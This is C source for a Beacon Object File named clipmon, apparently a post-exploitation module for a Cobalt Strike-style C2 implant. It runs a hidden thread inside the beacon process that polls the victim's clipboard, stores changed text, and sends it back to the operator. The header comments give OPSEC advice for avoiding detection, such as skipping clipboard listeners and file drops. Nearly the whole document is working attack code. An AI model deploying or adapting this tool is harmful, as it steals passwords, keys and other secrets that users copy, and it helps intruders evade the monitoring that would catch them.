/*
 * clipmon.c — in-process clipboard watcher (no hooks, no window chain).
 *
 * args: int seconds (0 = stop a running capture and flush what was collected)
 *
 * Spawns one worker thread in the beacon process that polls
 * OpenClipboard/GetClipboardData(CF_TEXT) every 500 ms, records changed
 * content into a capped section list, and pushes the text out via BeaconOutput
 * when the window elapses (lock-safe in-process output, any thread).
 *
 * State: statics live in the resident BOF section (sync-slot module-stomped
 * pool) so a later `clipmon 0` reaches a still-running capture from the same
 * beacon. If the BOF was reloaded (fresh slot), `clipmon 0` reports no active
 * capture — expected.
 *
 * OPSEC:
 *   - No SetClipboardViewer / AddClipboardFormatListener (no window message
 *     chain) — pure OpenClipboard polling from our own thread.
 *   - No process access, no file drops; only our own CreateThread.
 *   - Keep durations short; the beacon thread itself is free (worker sleeps).
 */
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include "beacon.h"
#include "bofdefs.h"

DECLSPEC_IMPORT HGLOBAL WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GlobalUnlock(HGLOBAL);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int    __cdecl MSVCRT_memcmp(const void*, const void*, size_t);

DECLSPEC_IMPORT BOOL   WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT BOOL   WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT BOOL   WINAPI USER32$IsClipboardFormatAvailable(UINT);

#define CAP_SECTIONS 64
#define SECTION_CAP  4096

typedef struct _CLIP_STATE {
    HANDLE  thr;
    LONG    running;
    LONG    stopReq;
    DWORD   endTick;
    char*   sections[CAP_SECTIONS];
    int     secCount;
} CLIP_STATE;

static CLIP_STATE gClip;

static void ClipAppendText(const char* text)
{
    if (!text || !*text) return;
    if (gClip.secCount >= CAP_SECTIONS) return;
    unsigned long n = (unsigned long)MSVCRT$strlen(text);
    if (n > SECTION_CAP - 32) n = SECTION_CAP - 32;
    char* sec = (char*)intAlloc(n + 32);
    if (!sec) return;
    MSVCRT$memset(sec, 0, n + 32);
    MSVCRT$sprintf(sec, "[clip @%lu] ", (unsigned long)(KERNEL32$GetTickCount() / 1000));
    MSVCRT$memcpy(sec + MSVCRT$strlen(sec), text, n);
    gClip.sections[gClip.secCount++] = sec;
}

static BOOL LocalCmpA(const void* a, const void* b, unsigned long n)
{
    const char* x = (const char*)a;
    const char* y = (const char*)b;
    for (unsigned long i = 0; i < n; i++)
        if (x[i] != y[i]) return FALSE;
    return TRUE;
}

static DWORD WINAPI ClipWorker(LPVOID param)
{
    (void)param;
    char lastSig[16];
    MSVCRT$memset(lastSig, 0, sizeof(lastSig));

    while (!gClip.stopReq) {
        if (KERNEL32$GetTickCount() >= gClip.endTick) break;
        (void)LocalCmpA;

        BOOL captured = FALSE;
        if (USER32$IsClipboardFormatAvailable(CF_TEXT) && USER32$OpenClipboard(NULL)) {
            HANDLE h = USER32$GetClipboardData(CF_TEXT);
            if (!h) { USER32$CloseClipboard(); }
            else {
                char* txt = (char*)KERNEL32$GlobalLock(h);
                if (txt) {
                    char sig[16];
                    MSVCRT$memset(sig, 0, sizeof(sig));
                    unsigned long n = (unsigned long)MSVCRT$strlen(txt);
                    if (n >= 1) MSVCRT$memcpy(sig, txt, n > sizeof(sig) - 1 ? sizeof(sig) - 1 : n);
                    if (!LocalCmpA(sig, lastSig, sizeof(sig))) {
                        MSVCRT$memcpy(lastSig, sig, sizeof(sig));
                        ClipAppendText(txt);
                        captured = TRUE;
                    }
                    KERNEL32$GlobalUnlock(h);
                }
                USER32$CloseClipboard();
            }
        }
        KERNEL32$Sleep(captured ? 800 : 500);
    }

    char hdr[64];
    MSVCRT$sprintf(hdr, "[clipmon] flush, %d section(s):\n", gClip.secCount);
    BeaconOutput(CALLBACK_OUTPUT, hdr, (int)MSVCRT$strlen(hdr));
    for (int i = 0; i < gClip.secCount; i++) {
        if (gClip.sections[i]) {
            BeaconOutput(CALLBACK_OUTPUT, gClip.sections[i], (int)MSVCRT$strlen(gClip.sections[i]));
            intFree(gClip.sections[i]);
            gClip.sections[i] = NULL;
        }
    }
    gClip.secCount = 0;
    gClip.running  = 0;
    return 0;
}

void go(char* args, int alen)
{
    datap p;
    BeaconDataParse(&p, args, alen);
    int secs = BeaconDataInt(&p);

    if (secs == 0) {
        if (!gClip.running) {
            BeaconOutput(CALLBACK_OUTPUT, "[clipmon] no active capture\n", 27);
            return;
        }
        gClip.stopReq = 1;
        KERNEL32$Sleep(600);           /* give the worker its tail poll */
        if (gClip.thr) { KERNEL32$CloseHandle(gClip.thr); gClip.thr = NULL; }
        gClip.running = 0;
        BeaconOutput(CALLBACK_OUTPUT, "[clipmon] stopped, flushing next poll\n", 37);
        return;
    }

    for (int i = 0; i < CAP_SECTIONS; i++) gClip.sections[i] = NULL;
    gClip.secCount = 0;
    gClip.stopReq  = 0;
    gClip.endTick  = KERNEL32$GetTickCount() + (DWORD)secs * 1000;
    gClip.thr = KERNEL32$CreateThread(NULL, 0, ClipWorker, NULL, 0, NULL);
    if (!gClip.thr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] clipmon: CreateThread failed\n");
        return;
    }
    gClip.running = 1;

    char buf[64];
    MSVCRT$sprintf(buf, "[clipmon] capture %d s (poll, no hooks)\n", secs);
    BeaconOutput(CALLBACK_OUTPUT, buf, (int)MSVCRT$strlen(buf));
}